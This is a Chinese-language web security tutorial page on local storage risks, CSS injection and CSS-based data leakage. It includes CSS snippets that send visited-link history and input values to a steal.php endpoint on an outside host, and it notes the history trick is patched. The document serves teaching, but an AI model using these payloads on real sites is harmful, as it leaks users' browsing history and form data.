---
layout: default
---
# ![](../img/hj.jpg)本地存储风险+CSS+ActionScript


## ![](../img/github11.png)本地存储风险
>小贱提示： 本地存储的主要风险是被植入广告跟踪标志。

#### Cookie
见“Cookie安全”

#### userData
这种存储方式仅IE浏览器自己支持，key-value模式

#### localStorage
HTML5的本地存储，key-value模式，如果仅存储在内存中，则是sessionStorage。

语法都一样，只是一个存储在本地，一个存储在内存。

语句如下：
```
localStorage.setItem("a","xxxxx");  	// 设置
localStorage.getItem("a");				//获取a的值
localStorage.removeItem("a")			//删除a的值

localStorage存储对XSS没有任何防御机制，不像cookie有HttpOnly，所以一旦有XSS，localStorage就泄露了
localStorage没有时限，需用户主动删除，否则永久存在
```
#### Flash Cookie
Flash的本地共享对象（LSO），key-value模式，跨浏览器
## ![](../img/github10.png)CSS

#### CSS容错性
在前面加花括号{}即可正常解析含有非法字符的代码。（IE浏览器下是}）
如
```html
{}h1{font-size:50px;color:red;</style><div>XXX</div>}h2{color:green}
```
#### 样式伪装
用于ClickJacking和XSS高级钓鱼
#### CSS伪类

|  伪类   |  描述   |
| --- | --- |
| :link			| 	有链接属性时|
| :visited	| 		链接被访问过|
| :active		| 	点击激活时|
| :hover		| 	鼠标移过时|

:visited举例

曾经的CSS History利用:visited伪类（已经修复，举这个例子为了方便理解原理）
```html
先准备一批如下形式的常用链接：
<a href="http://www.baidu.com/" id="a1">http://www.baidu.com/</a><br />
<a href="http://www.17173.com/" id="a2">http://www.17173.com/</a><br />
<a href="http://www.joy.com/" id="a3">http://www.joy.com/</a><br />
<a href="http://www.qq.com/" id="a4">http://www.qq.com/</a><br />
<a href="http://www.rayli.com/" id="a5">http://www.rayli.com/</a><br />
针对id设置对应的:visited样式：
#a1:visited {background: url(http://www.8pwn.com/css/steal.php?data=a1);}
#a2:visited {background: url(http://www.8pwn.com/css/steal.php?data=a2);}
#a3:visited {background: url(http://www.8pwn.com/css/steal.php?data=a3);}
#a4:visited {background: url(http://www.8pwn.com/css/steal.php?data=a4);}
#a5:visited {background: url(http://www.8pwn.com/css/steal.php?data=a5);}
```
>小贱提示：
>
>如果某链接之前被访问过（即存在于历史纪录中的），则:visited会触发，并发送请求到目标网址，这样就知道被攻击者历史纪录中是否存在这个网站

::selection举例

Chrome下有效
```html
<style>
#select{border:1px dashed #09c;}
#select::selection{background:url(http://www.8pwn.com/css/steal.php?data=selection);}
</style>
<div id="select">select me</div>
```

#### CSS3属性选择符

判断目标input表单项的值是否以x开头，如果是，则触发一次唯一性请求：
```html
<style>
input[value^="x"]{background: url(http://www.8pwn.com/css/steal.php?data=0x);}
</style>
attr selector: <input type="text" value="xyz" /><br />
[ok] ff12/chrome19/opera12<br /><br />
```
>小贱提示：没什么实用价值，只是思路值得学习

## ![](../img/github12.png)ActionScript
简称AS，与JS都遵循ECMAScipt标准，所以同样遵循E4X




__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
